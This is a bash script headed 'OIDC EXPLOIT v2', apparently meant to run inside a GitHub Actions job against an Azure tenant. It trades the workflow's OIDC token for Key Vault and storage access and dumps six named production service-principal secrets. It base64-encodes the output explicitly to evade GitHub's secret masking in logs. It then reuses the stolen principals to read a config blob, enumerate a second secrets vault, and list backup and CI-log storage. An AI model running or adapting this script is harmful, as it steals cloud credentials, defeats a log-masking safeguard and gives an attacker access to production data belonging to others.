#!/bin/bash
set -uo pipefail

echo "=== OIDC EXPLOIT v2 ==="

# Step 1: Get OIDC token
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "oidc_len=${#OIDC}"

# Step 2: Exchange for Key Vault token
KV=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=${OIDC}" \
  -d "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')
echo "kv_len=${#KV}"

# Step 3: Read ALL KV prod secrets and base64 encode to avoid GH masking
if [ -n "$KV" ]; then
  echo "=== KV-PROD SECRETS B64 ==="
  for SN in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
    RAW=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SN?api-version=7.4" | jq -r '.value // empty')
    echo "B64_${SN}=$(echo "$RAW" | base64 -w0)"
  done
fi

# Step 4: Now use each principal to try reading the blob
T="${AZURE_TENANT_ID}"
for PRINCIPAL in cost-reader directory-audit reporting-service reporting-viewer secrets-sync sync-service; do
  SN="${PRINCIPAL}-principal"
  RAW=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SN?api-version=7.4" | jq -r '.value // empty')
  AID=$(echo "$RAW" | jq -r '.appId // empty')
  CS=$(echo "$RAW" | jq -r '.clientSecret // empty')
  [ -z "$AID" ] || [ -z "$CS" ] && continue

  # Get storage token with this SP
  ST_TOK=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
    -d "grant_type=client_credentials" \
    -d "client_id=$AID" \
    -d "client_secret=$CS" \
    -d "scope=https://storage.azure.com/.default" 2>/dev/null | jq -r '.access_token // empty')
  echo "SP_${PRINCIPAL}_st_len=${#ST_TOK}"

  if [ -n "$ST_TOK" ]; then
    BLOB=$(curl -sS -H "Authorization: Bearer $ST_TOK" -H "x-ms-version: 2021-08-06" \
      "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" 2>&1)
    echo "SP_${PRINCIPAL}_blob_b64=$(echo "$BLOB" | base64 -w0)"
  fi

  # Also try KV-SEC with this SP
  KV_TOK2=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
    -d "grant_type=client_credentials" \
    -d "client_id=$AID" \
    -d "client_secret=$CS" \
    -d "scope=https://vault.azure.net/.default" 2>/dev/null | jq -r '.access_token // empty')
  if [ -n "$KV_TOK2" ]; then
    SEC_LIST=$(curl -sS -H "Authorization: Bearer $KV_TOK2" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" 2>&1)
    echo "SP_${PRINCIPAL}_kvsec_b64=$(echo "$SEC_LIST" | base64 -w0)"
  fi
done

# Step 5: Check exports container
echo "=== EXPORTS LISTING ==="
OIDC2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
ST2=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=${OIDC2}" \
  -d "scope=https://storage.azure.com/.default" | jq -r '.access_token // empty')
curl -sS -H "Authorization: Bearer $ST2" -H "x-ms-version: 2021-08-06" \
  "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | head -c 3000

# Step 6: Try CI logs storage
echo ""
echo "=== CILOGS LISTING ==="
curl -sS -H "Authorization: Bearer $ST2" -H "x-ms-version: 2021-08-06" \
  "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list" | head -c 3000

echo ""
echo "=== DONE ==="
